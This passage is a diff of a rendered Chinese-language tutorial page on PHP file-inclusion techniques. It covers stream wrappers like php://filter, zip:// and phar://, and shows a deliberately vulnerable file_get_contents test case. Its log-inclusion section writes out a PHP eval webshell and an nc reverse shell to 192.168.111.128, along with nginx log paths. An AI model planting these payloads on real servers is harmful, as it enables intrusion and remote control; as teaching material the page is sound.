     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>file:// — 访问本地文件系统
 http:// — 访问 HTTP(s) 网址
 ftp:// — 访问 FTP(s) URLs
@@ -281,14 +337,23 @@ expect:// — 处理交互式的流</p>
 <p>这些均可用于支持文件系统操作的函数例如fopen(),copy(),file_exists(), filesize()</p>
 <p>测试用例:</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> <span style="color:#ff636f">echo</span> <span style="color:#58a1dd">file_get_contents</span>(<span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;test&#39;</span>]); <span style="color:#828b96;font-style:italic">?&gt;</span>
-</span></span></code></pre></div><p>####### 1.file:// — 访问本地文件系统</p>
-<p>直接传入路径即可,以file://开始可能会失败
+</span></span></code></pre></div><h3 id="1file--访问本地文件系统" class="heading-element"><span>1.file:// — 访问本地文件系统</span>
+  <a href="#1file--%e8%ae%bf%e9%97%ae%e6%9c%ac%e5%9c%b0%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>直接传入路径即可,以file://开始可能会失败
 如果不加以限制可能会泄露信息
 访问:http://127.0.0.1/test.php?test=../phpStudy.ini</p>
-<p>####### 2.http:// — 访问 HTTP(s) 网址</p>
-<p>访问:http://127.0.0.1/test.php?test=http://127.0.0.1/test.php?test=test.php</p>
-<p>####### 3.ftp:// — 访问 FTP(s) URLs</p>
-<table>
+<h3 id="2http--访问-https-网址" class="heading-element"><span>2.http:// — 访问 HTTP(s) 网址</span>
+  <a href="#2http--%e8%ae%bf%e9%97%ae-https-%e7%bd%91%e5%9d%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>访问:http://127.0.0.1/test.php?test=http://127.0.0.1/test.php?test=test.php</p>
+<h3 id="3ftp--访问-ftps-urls" class="heading-element"><span>3.ftp:// — 访问 FTP(s) URLs</span>
+  <a href="#3ftp--%e8%ae%bf%e9%97%ae-ftps-urls" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><table>
 <thead>
 <tr>
 <th>1</th>
@@ -302,37 +367,52 @@ expect:// — 处理交互式的流</p>
 </tr>
 </tbody>
 </table>
-<p>####### 4.php:// — 访问各个输入/输出流（I/O streams）</p>
-<blockquote>
+<h3 id="4php--访问各个输入输出流io-streams" class="heading-element"><span>4.php:// — 访问各个输入/输出流（I/O streams）</span>
+  <a href="#4php--%e8%ae%bf%e9%97%ae%e5%90%84%e4%b8%aa%e8%be%93%e5%85%a5%e8%be%93%e5%87%ba%e6%b5%81io-streams" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><blockquote>
 <p>php://input,php://stdout,php://stderr 直接访问 PHP 进程相应的输入或者输出流
 php://fd 允许直接访问指定的文件描述符。 例如 php://fd/3 引用了文件描述符 3。
 php://memory 和 php://temp 是一个类似文件 包装器的数据流，允许读写临时数据。temp&gt;2M时写入文件
 php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用 在双off时都可以使用，容易造成任意文件读取</p>
 </blockquote>
-<p>####### 5.zip://,bzip2://, zlib:// — 压缩流</p>
-<p>双off也可以用
+<h3 id="5zipbzip2-zlib--压缩流" class="heading-element"><span>5.zip://,bzip2://, zlib:// — 压缩流</span>
+  <a href="#5zipbzip2-zlib--%e5%8e%8b%e7%bc%a9%e6%b5%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>双off也可以用
 用于读取压缩文件，注意#需要进行url编码
 #前为压缩文件路径，后为压缩文件内的文件名
 zip://test.zip%23file.txt</p>
-<p>####### 6.phar:// — PHP 归档</p>
-<p>同上
+<h3 id="6phar--php-归档" class="heading-element"><span>6.phar:// — PHP 归档</span>
+  <a href="#6phar--php-%e5%bd%92%e6%a1%a3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>同上
 注意压缩文件必须要后缀(可以是任意后缀)
 phar://test.zip/test.php</p>
-<p>####### 7.data:// — 数据（RFC 2397）</p>
-<p>很常用的数据流构造器 , 将读取后面base编码字符串后解码的数据作为数据流的输入
+<h3 id="7data--数据rfc-2397" class="heading-element"><span>7.data:// — 数据（RFC 2397）</span>
+  <a href="#7data--%e6%95%b0%e6%8d%aerfc-2397" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>很常用的数据流构造器 , 将读取后面base编码字符串后解码的数据作为数据流的输入
 一般用于构造输入:data://text/plain;base64,SSBsb3ZlIFBIUAo=</p>
-<p>####### 8.glob:// — 查找匹配的文件路径模式</p>
-<p>用于查找文件，但是没法直接使用
+<h3 id="8glob--查找匹配的文件路径模式" class="heading-element"><span>8.glob:// — 查找匹配的文件路径模式</span>
+  <a href="#8glob--%e6%9f%a5%e6%89%be%e5%8c%b9%e9%85%8d%e7%9a%84%e6%96%87%e4%bb%b6%e8%b7%af%e5%be%84%e6%a8%a1%e5%bc%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>用于查找文件，但是没法直接使用
 需要DirectoryIterator()</p>
-<h5 id="常用姿势" class="heading-element"><span>0.0.0.3  常用姿势</span>
+<h1 id="常用姿势" class="heading-element"><span>常用姿势</span>
   <a href="#%e5%b8%b8%e7%94%a8%e5%a7%bf%e5%8a%bf" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="日志文件包含" class="heading-element"><span>0.0.0.3.1  日志文件包含</span>
+</h1><h2 id="日志文件包含" class="heading-element"><span>日志文件包含</span>
   <a href="#%e6%97%a5%e5%bf%97%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>可以写在User-Agent里或者其他地方</p>
+</h2><p>可以写在User-Agent里或者其他地方</p>
 <pre tabindex="0"><code>往日志写入webshell &lt;?php @eval($_POST[1]);?&gt; 
 写入反弹shell      &lt;?php system(&#39;nc 192.168.111.128 7788 -e /bin/sh&#39;);?&gt;</code></pre><pre tabindex="0"><code>nginx的日志默认路径
 访问日志：/usr/local/nginx/logs/access.log 或者 /var/log/nginx/access.log
